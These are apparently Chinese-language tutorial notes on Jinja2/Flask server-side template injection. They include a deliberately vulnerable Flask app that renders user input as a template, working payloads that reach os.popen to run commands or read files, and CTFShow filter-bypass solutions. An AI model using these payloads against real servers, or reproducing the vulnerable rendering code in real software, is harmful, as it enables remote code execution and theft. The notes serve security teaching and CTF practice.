# WEB攻防-Python安全&SSTI模版注入&Jinja2引擎&利用绕过项目&黑盒检测

![image-20260115195820905](images/image-20260115195820905.png)

__class__       类的一个内置属性，表示实例对象的类。

__base__       类型对象的直接基类

__bases__       类型对象的全部基类，以元组形式，类型的实例通常没有属性 

__mro__        method resolution order，即解析方法调用的顺序；此属性是由类组成的元       组，在方法解析期间会基于它来查找基类。

__subclasses__()   返回这个类的子类集合，每个类都保留一个对其直接子类的弱引用列表。该方法返回一个列表，其中包含所有仍然存在的引用。列表按照定义顺序排列。

__init__       初始化类，返回的类型是function

__globals__      使用方式是 函数名.__globals__获取function所处空间下可使用的module、方法以及所有变量。

__dic__        类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里

__getattribute__()  实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。

__getitem__()     调用字典中的键值，其实就是调用这个魔术方法，比如a['b']，就是a.__getitem__('b')

__builtins__     内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。

__import__      动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__('os').popen('ls').read()]

__str__()       返回描写这个对象的字符串，可以理解成就是打印出来。

url_for        flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app。

get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且get_flashed_messages.__globals__['__builtins__']含有current_app。

lipsum        flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：{{lipsum.__globals__['os'].popen('ls').read()}}

current_app      应用上下文，一个全局变量。

request        可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.__init__.__globals__['__builtins__'].open('/proc\self\fd/3').read()

request.args.x1     get传参

request.values.x1    所有参数

request.cookies    cookies参数

request.headers    请求头参数

request.form.x1    post传参   (Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)

request.data      post传参   (Content-Type:a/b)

request.json     post传json  (Content-Type: application/json)

config        当前application的所有配置。此外，也可以这样{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}

g           {{g}}得到<flask.g of 'flask_ssti'>

   





1、什么是SSTI

SSTI（Server Side Template Injection，服务器端模板注入）

服务端接收攻击者的输入，将其作为Web应用模板内容的一部分

在进行目标编译渲染的过程中，进行了语句的拼接，执行了所插入的恶意内容

从而导致信息泄露、代码执行、GetShell等问题，其影响范围取决于模版引擎复杂性，

注意：模板引擎和渲染函数本身是没有漏洞的,该漏洞产生原因在于模板可控引发代码注入

 

2、各语言框架SSTI

PHP：smarty、twig

Python：jinja2、mako、tornad、Django

java：Thymeleaf、jade、velocity、FreeMarker

其他：https://github.com/Pav-ksd-pl/websitesVulnerableToSSTI

 

3、Python-SSTI形成

from flask import Flask, request, render_template_string

from jinja2 import Template

app = Flask(__name__)

 

@app.route('/')

def index():

  name = request.args.get('name', default='xiaodi')

  t = '''

​    <html>

​      <h1>Hello %s</h1>

​    </html>

​    ''' % (name)

  \# 将一段字符串作为模板进行渲染

  return render_template_string(t)

app.run()

 

4、Python-SSTI利用

判断利用

1、看那些类可用

{{''.__class__.__base__.__subclasses__()}}

2、找利用类索引

<class 'os._wrap_close'>

3、找利用类方法

{{''.__class__.__base__.__subclasses__()[133].__init__.__globals__}}

4、构造利用类方法

{{''.__class__.__base__.__subclasses__()[133].__init__.__globals__.popen('calc')}}

 

其他：

{{[].__class__.__base__.__subclasses__()}}

{{[].__class__.__base__.__subclasses__()[133].__init__.__globals__}}

{{[].__class__.__base__.__subclasses__()[133].__init__.__globals__['popen']('calc')}}

 

其他引用：

config：{{config.__class__.__init__.__globals__['os'].popen('calc')}}

url_for：{{url_for.__globals__.os.popen('calc')}}

lipsum：{{lipsum.__globals__['os'].popen('calc')}}

get_flashed_messages：{{get_flashed_messages.__globals__['os'].popen('calc')}}

 

绕过限制-CtfShow项目

参考：

https://www.cnblogs.com/tuzkizki/p/15394415.html

https://blog.csdn.net/m0_74456293/article/details/129429424

Web 361 无过滤

?name={{''.__class__.__base__.__subclasses__()[132].__init__.__globals__.popen('cat /flag').read()}}

Web 362 过滤数字2 3

?name={{config.__class__.__init__.__globals__['os'].popen('cat /flag').read()}}

Web 363 过滤单引号

?name={{config.__class__.__init__.__globals__[request.args.a].popen(request.args.b).read()}}&a=os&b=cat /flag

Web 364 过滤单引号+args

?name={{config.__class__.__init__.__globals__[request.values.a].popen(request.values.b).read()}}&a=os&b=cat /flag

Web 365 过滤了中括号

?name={{url_for.__globals__.os.popen(request.values.c).read()}}&c=cat /flag

Web 366 过滤了下划线

?name={{(lipsum|attr(request.values.a)).os.popen(request.values.b).read()}}&a=__globals__&b=cat /flag

 

5、Python-SSTI项目

黑盒中建议判断利用：

https://github.com/epinna/tplmap

https://github.com/vladko312/SSTImap